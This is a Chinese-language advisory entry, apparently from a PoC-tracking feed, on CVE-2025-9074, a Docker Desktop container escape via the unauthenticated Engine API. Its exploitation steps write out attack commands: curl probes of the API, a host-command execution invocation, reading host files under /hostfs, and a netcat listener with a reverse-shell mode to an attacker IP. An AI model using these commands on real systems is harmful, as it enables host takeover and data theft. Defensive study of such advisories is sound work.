## CVE-2025-9074 - Docker Desktop 容器逃逸

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** Docker Desktop < 4.44.3

**利用条件:** 需要本地容器访问权限，无需认证

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-9074是一个影响Docker Desktop的严重容器逃逸漏洞，被评为9.3的CVSS高危漏洞。此漏洞允许在Windows和macOS系统上运行的恶意Linux容器绕过Docker Desktop的隔离机制，未经认证地直接访问宿主机上的Docker Engine API。受影响的版本包括Docker Desktop 4.44.3之前的Windows和macOS版本。该漏洞已于2025年8月20日在Docker Desktop 4.44.3及更高版本中得到修复。值得注意的是，使用Unix socket的Linux系统不受此漏洞影响。

该漏洞的核心根源在于Docker Engine API在默认配置下，通过TCP socket（通常是`http://192.168.65.7:2375`）向容器内部暴露，且无需任何认证。这意味着即使启用了增强容器隔离（ECI）或关闭了“Expose daemon on tcp://localhost:2375 without TLS”等安全设置，恶意容器仍能直接连接并操作Docker Engine。攻击者可以利用此未经认证的API访问权限，创建、删除容器，挂载宿主机文件系统，并执行特权命令，从而完全绕过容器隔离。

**POC有效性分析**
提供的POC代码是一个功能完整的Python脚本，旨在利用CVE-2025-9074漏洞。它通过HTTP请求与暴露的Docker Engine API进行交互，支持多种利用模式。该POC的文档清晰，提供了详细的先决条件（`pip3 install requests`）和使用示例。POC能够成功实现以下关键功能：
1.  **命令执行模式 (Command Execution Mode)**：通过向Docker Engine API发送指令，在宿主机上执行任意命令。POC示例展示了如何执行`whoami`、读取Windows宿主机上的文件（例如`cat /hostfs/mnt/c/Users/Administrator/Desktop/root.txt`），以及列出用户目录（`ls -la /hostfs/mnt/c/Users`）。这些操作证明了POC能够突破容器隔离，并在宿主机文件系统上进行操作。
2.  **反向Shell模式 (Reverse Shell Mode)**：利用Docker Engine API创建特权容器，该容器可向攻击者指定的IP和端口发送反向Shell。这为攻击者提供了交互式的宿主机命令行访问权限，实现了完全的远程控制。
3.  **直接API访问验证**：POC还提供了一个简单的`curl`命令，用于从容器内部直接验证Docker Engine API的可访问性（`curl http://192.168.65.7:2375/version`），进一步确认了漏洞的存在及其未经认证的性质。
POC的攻击场景图清晰地描绘了从恶意容器到Docker Engine API、再到特权容器、最终实现宿主机完全访问的流程，增强了POC的可理解性和有效性。综上所述，该POC是高度有效且易于使用的，能够可靠地复现并利用CVE-2025-9074漏洞。

**利用步骤**
利用此漏洞需要攻击者首先在目标Docker Desktop环境中的某个Linux容器内获得执行权限。一旦获得容器访问权限，攻击者可以执行以下步骤：
1.  **准备环境**：在攻击者机器上安装Python3和`requests`库（`pip3 install requests`）。如果选择反向Shell模式，还需要设置一个监听器（例如`nc -lvnp <PORT>`）。
2.  **探测API**：在受控容器内部，可以首先通过`curl http://192.168.65.7:2375/version`命令来验证Docker Engine API是否可达且无需认证。
3.  **执行命令**：
    *   使用POC脚本，通过`command execution`模式在宿主机上执行任意命令。例如，`python3 exploit.py -u http://192.168.65.7:2375 -m cmd -c "whoami"`。
    *   若要读取宿主机文件，可以使用`cat /hostfs/mnt/c/Users/Administrator/Desktop/root.txt`等命令，其中`/hostfs`是宿主机文件系统被挂载的路径。
4.  **获取反向Shell**：
    *   在攻击者机器上启动Netcat监听器：`nc -lvnp 4444`。
    *   在受控容器内部执行POC脚本的反向Shell模式：`python3 exploit.py -u http://192.168.65.7:2375 -m reverse -l <YOUR_IP> -p 4444`。
    *   成功连接后，攻击者将获得一个在宿主机上以高权限运行的Shell。

**投毒风险分析**
对提供的POC代码（基于其描述和使用方式）的分析表明，其投毒风险极低（10%）。该POC旨在明确地利用CVE-2025-9074漏洞，其功能和行为完全符合漏洞验证和利用的目的。POC依赖标准的Python `requests`库和常见的系统工具（如Netcat用于反向Shell）。在POC的描述中，没有发现任何代码混淆、引用外部可疑脚本、执行非预期网络请求或包含潜在恶意负载的迹象。其代码逻辑专注于通过暴露的Docker Engine API实现容器逃逸，并执行宿主机命令或建立反向Shell。它是一个透明且直接的漏洞利用工具。因此，组织在进行防御性安全研究或漏洞复现时，可以在受控和隔离的环境中安全地使用此POC，而无需担心POC本身会引入额外的恶意软件或后门。

**项目地址:** 

**漏洞详情:** 
